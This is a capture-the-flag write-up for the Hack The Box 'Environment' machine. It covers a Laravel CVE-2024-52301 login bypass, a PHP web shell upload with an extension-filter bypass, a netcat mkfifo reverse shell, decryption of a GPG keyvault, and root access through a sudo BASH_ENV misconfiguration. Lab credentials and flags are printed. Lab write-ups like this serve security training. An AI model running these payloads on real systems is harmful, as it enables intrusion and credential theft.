Environment is an easy-difficulty Linux machine from Hack The Box where we exploited a **Laravel 11.30.0 CVE** using `--env=preprod` to bypass the login page and reach the file uploader to gain RCE on `www-data`‚Üí enumerate a backup directory to recover a GPG-encrypted keyvault and private keys ‚Üí import and decrypt it locally to obtain the `hish` user‚Äôs credentials ‚Üí finally escalate to root by abusing the `env_keep+="ENV BASH_ENV"` misconfiguration in sudo to inject commands and spawn a root shell.

## **Enumeration**

### Nmap Scan

```bash
‚îå‚îÄ‚îÄ(sanke„âøvbox)-[~/Downloads/environment]
‚îî‚îÄ$ nmap -A  10.10.11.67 -v 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 10:55 EDT

|_  Supported Methods: GET HEAD POST OPTIONS

```

So, we have 2 open port 22/tcp ssh and 80/tcp HTTP which will be our target in this machine.

I started by opening the website after adding the environment.htb to /etc/hosts of course.

Nothing suspicious in the website so i used feroxbuter to enumerate the directories. I guess there are hidden directories here

```bash
‚îå‚îÄ‚îÄ(sanke„âøvbox)-[~/Downloads/envirnment]
‚îî‚îÄ$ feroxbuster -u http://environment.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50

Okay, now we have something. We do have login page and we have /mailing also.

I tried accessing the /mailing directory and look what i found.

![Description](/assets/images/Environment/image(2).png)

We have laravel here with version defined as 11.30.0 

## **Exploitation**

First thing we do is trying to find a cve for this laravel version. What got my intention was this github page that speaks about a CVE-2024-52301.

https://github.com/Nyamort/CVE-2024-52301

So, What the poc is saying is to add after the /login a parameter ‚Äú?‚Äîenv=preprod‚Äù that will bypass the login page and forward us to http://environment.htb/management/dashboard

![Description](/assets/images/Environment/image(3).png)

After that forward the request and you will be automatically redirected to this page here as a user called ‚ÄúHish‚Äù.

![Description](/assets/images/Environment/image(4).png)

I went to the profile section and look what i found

![Description](/assets/images/Environment/image(5).png)

It‚Äôs an upload page , I was trying many things but the trick here was to bypass the php file so he can succesfully execute a reverse shell on our terminal.

So, using the https://www.revshells.com/ I retrieved the reverse shell of the PHP

```bash
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

But it wasn‚Äôt enough I created a file called rev.gif.php and added in the first line the header of the GIF which I found it in the internet ‚ÄúGIF87a‚Äù and even with this things i did , I wasn‚Äôt able to execute the reverse shell until i found out that adding a ‚Äú.‚Äù after the name of my file will bypass the file error upload. So, I renamed it to ‚Äúrev.gif.shell.‚Äù  and upload it.

![Description](/assets/images/Environment/image(6).png)

Let me now execute a simple netcat reverse to get the shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-IP> 1234 >/tmp/f
```

And in our listener we got the www-data user shell.

```bash
‚îå‚îÄ‚îÄ(sanke„âøvbox)-[~/Downloads/envirnment]
‚îî‚îÄ$ nc -lvnp 1234              
listening on [any] 1234 ...
connect to [10.10.14.103] from (UNKNOWN) [10.10.11.67] 37058
bash: cannot set terminal process group (913): Inappropriate ioctl for device
bash: no job control in this shell
www-data@environment:~/app/storage/app/public/files$ cd /home
www-data@environment:/home$ cd hish
www-data@environment:/home/hish$ ls
backup  user.txt
www-data@environment:/home/hish$ cat user.txt
ce9f15a1c4f7a1d62260a4fbed9403a4

```

And we got our user flag!!! Let‚Äôs gooo !!

in the hish directory there was a backup that got keyvault.gpg file. So, we gonna decrypt this file using the key that we can found in /home/hish/.gnupg

First thing to do is transfer all those files to the attacker machine using the Python HTTP server.

```bash
www-data@environment:/tmp$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.14.103 - - [06/Sep/2025 03:48:50] "GET /gnupg.tar.gz HTTP/1.1" 200 -
10.10.14.103 - - [06/Sep/2025 03:30:18] "GET /keyvault.gpg HTTP/1.1" 200 -

```

And after that i just extracted the tar file and used the gpg decryption to get the passwords.

```bash
‚îå‚îÄ‚îÄ(sanke„âøvbox)-[~/Downloads/envirnment]
‚îî‚îÄ$ tar -xzf gnupg.tar.gz

‚îå‚îÄ‚îÄ(sanke„âøvbox)-[~/Downloads/envirnment]
‚îî‚îÄ$ gpg --decrypt keyvault.gpg
    PAYPAL.COM -> Ihaves0meMon$yhere123
    ENVIRONMENT.HTB -> marineSPm@ster!!
    FACEBOOK.COM -> summerSunnyB3ACH!!
```

After i tried the 3 passwords with the hish user. I noticed the ‚ÄúmarineSPm@ster!!‚Äù working on ssh.

```bash
ssh hish@10.10.11.67
marineSPm@ster!!
```

## **Privilige escalation**

We start with the classic enumeration step: checking `sudo -l`.

```bash
hish@environment:~$ sudo -l
[sudo] password for hish: 
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo

```

The interesting part here is:

- The script `/usr/bin/systeminfo` can be run with `sudo`.
- The `sudo` configuration allows the environment variables `ENV` and `BASH_ENV` to be kept.
- Since `/usr/bin/systeminfo` is a **bash script**, it will load the file specified in `BASH_ENV` on execution.

This means we can abuse `BASH_ENV` to inject our own commands and get a root shell.

---

1. Create a malicious script that spawns a root shell:

```bash
echo "/bin/bash -p" > /tmp/rootme
chmod +x /tmp/rootme
```

1. Export it as `BASH_ENV`:

```bash
export BASH_ENV=/tmp/rootme
```

1. Run the vulnerable script with `sudo`:

```bash
sudo /usr/bin/systeminfo
```

1. This drops us into a **root shell**:

```bash
root@environment:/home/hish# cat /root/root.txt
788fb20e766ed6f427577ca9088e4aee
```

‚úÖ Exploited `BASH_ENV` variable + sudo misconfiguration to escalate privileges to **root**.
